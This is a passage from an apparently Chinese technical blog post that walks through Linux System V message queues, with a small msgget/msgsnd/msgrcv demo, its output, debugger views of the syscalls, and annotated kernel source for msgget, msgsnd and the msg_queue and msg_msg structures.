class="string">&quot;this is message from que&quot;</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">readbuf</span>;</span></span><br><span class="line">        <span class="keyword">int</span> msgid= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">key_t</span> key;</span><br><span class="line">        key = ftok(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;z&#x27;</span>);<span class="comment">//获取键值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key=%x\n&quot;</span>,key);</span><br><span class="line">        msgid=msgget(key,IPC_CREAT|<span class="number">0777</span>);<span class="comment">//在内核中打开或建立键值为key的，权限为0777的消息队列</span></span><br><span class="line">        <span class="keyword">if</span>(msgid == <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;create msgq failure\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        msgsnd(msgid,&amp;sendbuf,<span class="built_in">strlen</span>(sendbuf.mtext),<span class="number">0</span>);<span class="comment">//往队列id为msgid的队列写入sendbuf(类型为888)数据</span></span><br><span class="line">        msgrcv(msgid,&amp;readbuf,<span class="keyword">sizeof</span>(readbuf.mtext),<span class="number">999</span>,<span class="number">0</span>);<span class="comment">//从队列中获取999类型的数据，如果队列中未出现999类型的数据，则程序阻塞在这里</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,readbuf.mtext);</span><br><span class="line">        msgctl(msgid,IPC_RMID,<span class="literal">NULL</span>);<span class="comment">//将队列从系统内核中删除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./read </span><br><span class="line">key=<span class="number">7</span>a05274f <span class="comment">/* 获取同一个key */</span></span><br><span class="line">read from que:<span class="keyword">this</span> is message from que </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./send          </span><br><span class="line">key=<span class="number">7</span>a05274f <span class="comment">/* 获取同一个key */</span></span><br><span class="line"><span class="number">888</span> message already received</span><br></pre></td></tr></table></figure>
<ul>
<li>如果只在同一个进程中传递信息，则不提供 key 也可以</li>
</ul>
<p><strong>Linux 中 msg 的实现</strong></p>
<p>创建或打开消息队列 <code>msgget</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee3019</span> &lt;msgget+<span class="number">9</span>&gt;        syscall  &lt;SYS_msgget&gt;</span><br><span class="line">       key: <span class="number">0x7a05274f</span></span><br><span class="line">       msgflg: <span class="number">0x3ff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用户态的底层就是一个 syscall</li>
<li>内核态中就是以下这个函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*getnew)(struct ipc_namespace *, struct ipc_params *);</span><br><span class="line">	<span class="keyword">int</span> (*associate)(struct kern_ipc_perm *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*more_checks)(struct kern_ipc_perm *, struct ipc_params *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">msg_ops</span> =</span> &#123;</span><br><span class="line">		.getnew = newque,</span><br><span class="line">		.associate = security_msg_queue_associate,</span><br><span class="line">	&#125;; <span class="comment">/* 初始化&quot;创建例程&quot; */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_params</span> <span class="title">msg_params</span>;</span></span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns; <span class="comment">/* 获取当前IPC命名空间 */</span></span><br><span class="line"></span><br><span class="line">	msg_params.key = key; <span class="comment">/* 键值 */</span></span><br><span class="line">	msg_params.flg = msgflg; <span class="comment">/* 标识符 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipcget(ns, &amp;msg_ids(ns), &amp;msg_ops, &amp;msg_params); <span class="comment">/* 核心函数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ipcget</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (params-&gt;key == IPC_PRIVATE) <span class="comment">/* 是否私有 */</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_new(ns, ids, ops, params); <span class="comment">/* 创建一个新的ipc对象 */</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_public(ns, ids, ops, params); <span class="comment">/* 获取一个ipc对象或创建一个新对象 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ipcget_new</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// *ns: ipc命名空间</span></span><br><span class="line">    <span class="comment">// *ids: ipc标识符集</span></span><br><span class="line">    <span class="comment">// *ops: 要调用的实际创建例程</span></span><br><span class="line">    <span class="comment">// *params: 它的参数</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;ids-&gt;rwsem); <span class="comment">/* 写者申请[得到]读写信号量sem时调用 */</span></span><br><span class="line">	err = ops-&gt;getnew(ns, params); <span class="comment">/* 其实就是执行了&quot;创建例程&quot;中的newque */</span></span><br><span class="line">	up_write(&amp;ids-&gt;rwsem); <span class="comment">/* 写者[释放]读写信号量sem时调用 */</span></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前面这些可以说是 “共享内存”，“信号量”，“消息队列” 的通用部分，只是 <code>ipc_ops</code> 结构体的初始化不同</li>
<li>其实这里可以看出一点面向对象的思想了</li>
<li>函数 <code>newque</code> 的源码如下：（创建一个新的消息队列）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="comment">// *ns: 命名空间</span></span><br><span class="line">    <span class="comment">// *params: 指向包含key和msgflg的结构体(ipc_params)</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL); <span class="comment">/* 为msg_queue分配内核堆空间 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	</span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm); <span class="comment">/* 将msg_queue添加到消息队列基数树中,并取回基数树id */</span></span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni); <span class="comment">/* 新创建的msg_queue结构挂到msg_ids里面的基数树上 */</span></span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free); <span class="comment">/* 释放目标 */</span></span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>msgget</code> 会在内核堆空间中创建一个 <code>msg_queue</code> 结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>msgsnd</code> 和 <code>msgrcv</code> 都依靠另一个重要的结构体 - <code>msg_msg</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *security;		<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>往消息队列中添加消息 <code>msgsnd</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee2eb8</span> &lt;msgsnd+<span class="number">24</span>&gt;    syscall  &lt;SYS_msgsnd&gt;</span><br><span class="line">       msqid: <span class="number">0x16</span></span><br><span class="line">       msgp: <span class="number">0x7fffffffddd0</span> ◂— <span class="number">0x378</span></span><br><span class="line">       msgsz: <span class="number">0x18</span></span><br><span class="line">       msgflg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用户态的底层还是一个 syscall</li>
<li>内核态中就是以下这个函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> mtype;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype)) <span class="comment">/* 从用户空间获取单个数据-msg类型 */</span></span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz); <span class="comment">/* 先调用&quot;alloc_msg(msgsz)&quot;创建一个msg_msg结构体,然后调用&quot;copy_from_user(msg+1,mtext,msgsz)&quot;拷贝用户空间的mtext紧跟msg_msg结构体的后面 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line"></span><br><span class="line">	msg-&gt;m_type = mtype; <span class="comment">/* 写入msg类型 */</span></span><br><span class="line">	msg-&gt;m_ts = msgsz; <span class="comment">/* 写入msg大小 */</span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid); <span class="comment">/* 通过msqid从namespace中找到对应的msq-&gt;q_perm结构体,然后调用container_of通过偏移计算得到msg_queue结构体地址 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		err = PTR_ERR(msq);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_sender</span> <span class="title">s</span>;</span> <span class="comment">/* 定义了发送消息链表 */</span></span><br><span class="line"></span><br><span class="line">		err = -EACCES;</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IWUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123; <span class="comment">/* 检查该队列是否被删除 */</span></span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = security_msg_queue_msgsnd(&amp;msq-&gt;q_perm, msg, msgflg); <span class="comment">/* 调用一个钩子函数 */</span></span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		<span class="keyword">if</span> (msg_fits_inqueue(msq, msgsz)) <span class="comment">/* 检查消息队列是否满 */</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* queue full, wait: */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123; <span class="comment">/* IPC_NOWAIT:当消息队列已满的时候,msgsnd函数不等待立即返回 */</span></span><br><span class="line">			err = -EAGAIN;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* enqueue the sender and prepare to block */</span></span><br><span class="line">		ss_add(msq, &amp;s, msgsz);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ipc_rcu_getref(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123; <span class="comment">/* 检查该队列是否被删除 */</span></span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">		ss_del(&amp;s);</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123; <span class="comment">/* 仅仅检查一下是否有信号,不处理信号 */</span></span><br><span class="line">			err = -ERESTARTNOHAND;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_update_pid(&amp;msq-&gt;q_lspid, task_tgid(current));</span><br><span class="line">	msq-&gt;q_stime = ktime_get_real_seconds();</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/* 如果有被阻塞的接收进程,且消息满足接收要求,则将消息直接发送给被阻塞的接收进程</span></span><br><span class="line"><span class="comment">    否则,将消息排入消息队列尾 */</span> </span><br><span class="line">	<span class="keyword">if</span> (!pipelined_send(msq, msg, &amp;wake_q)) &#123;</span><br><span class="line">		list_add_tail(&amp;msg-&gt;m_list, &amp;msq-&gt;q_messages); <span class="comment">/* 插入msg_msg链表的尾部 */</span></span><br><span class="line">		msq-&gt;q_cbytes += msgsz;</span><br><span class="line">		msq-&gt;q_qnum++;</span><br><span class="line">		atomic_add(msgsz, &amp;ns-&gt;msg_bytes);</span><br><span class="line">		atomic_inc(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">	msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (msg != <span class="literal">NULL</span>)</span><br><span class="line">		free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里总结一下 <code>do_msgsnd</code> 的功能：<ul>
<li>调用 <code>load_msg</code> 创建一个 msg_msg 结构体，把数据拷贝到该 msg_msg 的后面</li>
<li>通过 msqid 计算得到 msg_queue 结构体地址</li>
<li>检查 msg_queue 后，对将要被发送的数据进行处理：<ul>
<li>如果有被阻塞的接收进程，则将消息直接发送给被阻塞的接收进程</li>
<li>否则，将消息排入消息队列尾</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>从消息队列中读取消息 <code>msgrcv</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee2f68</span> &lt;msgrcv+<span class="number">24</span>&gt;    syscall  &lt;SYS_msgrcv&gt;</span><br><span class="line">       msqid: <span class="number">0x16</span></span><br><span class="line">       msgp: <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line">       msgsz: <span class="number">0x80</span></span><br><span class="line">       msgtyp: <span class="number">0x3e7</span></span><br><span class="line">       msgflg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用户态的底层还是一个 syscall</li>
<li>内核态中就是以下这个函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
